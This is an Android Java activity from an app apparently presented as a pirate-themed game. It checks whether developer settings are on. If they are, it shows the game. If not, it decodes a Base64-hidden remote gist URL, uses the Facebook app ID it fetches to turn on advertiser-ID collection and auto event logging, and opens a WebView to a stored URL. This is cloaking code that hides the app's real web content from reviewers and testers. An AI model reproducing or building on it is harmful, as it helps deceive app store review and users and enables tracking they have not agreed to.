package cam.cradev.pirat2.crapirafd;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Button;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.facebook.FacebookSdk;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import cam.cradev.pirat2.crapirafd.acti.MainActivity;
import cam.cradev.pirat2.crapirafd.acti.Pss;
import cam.cradev.pirat2.crapirafd.acti.Web1;
import cam.cradev.pirat2.crapirafd.webbb.WebClient1;
import cam.cradev.pirat2.crapirafd.kg.Kg;

public class CP extends Activity {

    Button buttonG;
    Button buttonP;
    ProgressBar progressBar;
    int sas;
    public static String kdfs;
    public static String kfsf;
    public static String lfdjd;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.cp);
        getWindow().addFlags(1024);

        buttonG = findViewById(R.id.button2);
        buttonP = findViewById(R.id.button3);
        progressBar = findViewById(R.id.progressBar);
        WebClient1.cpp = this;
        hfd();
        if (sas == 0){

            new Thread(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.O)
                @Override
                public void run() {
                    try {
                        HttpURLConnection ldfj = (HttpURLConnection) new URL(RandomText.vvv("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzLzE4ZjQ3ZmE3ODVkYmQ5ZmI3MTU3NDNjOWM5NzcwNTEzL3Jhdy9DcmF6eV9QaXJhdGU=")).openConnection();
                        BufferedReader qwes = new BufferedReader(new InputStreamReader(ldfj.getInputStream()));
                        String s = qwes.readLine();
                        String [] a = s.split("\\\u007C");
                        kdfs = a[0];
                        kfsf = a[1];
                        lfdjd = a[2];

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {

                                FacebookSdk.setApplicationId(lfdjd);
                                FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                                FacebookSdk.sdkInitialize(getApplicationContext());
                                FacebookSdk.fullyInitialize();
                                FacebookSdk.setAutoInitEnabled(true);
                                FacebookSdk.setAutoLogAppEventsEnabled(true);
                                Pppaaa.di(CP.this);

                                if (drf().equals("idsk")){

                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            Kg.kg(CP.this);
                                        }
                                    },5000);

                                }else {

                                    Intent intent = new Intent(getApplicationContext(),Web1.class);
                                    intent.putExtra("ueghjd",drf());
                                    startActivity(intent);
                                    finishAffinity();
                                }

                            }
                        });


                    }catch (Exception e){
                        startActivity(new Intent(getApplicationContext(), MainActivity.class));
                        finishAffinity();
                    }
                }
            }).start();

        }else {
            Pss pss = new Pss(buttonG,buttonP,progressBar,this);
            pss.pss();
        }

    }

    private void hfd(){
        sas = Settings.Secure.getInt(this.getContentResolver(),Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private String drf(){
        String sav = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(RandomText.vvv("c2F2ZWRVcmw="), "idsk");
        return sav;
    }
}
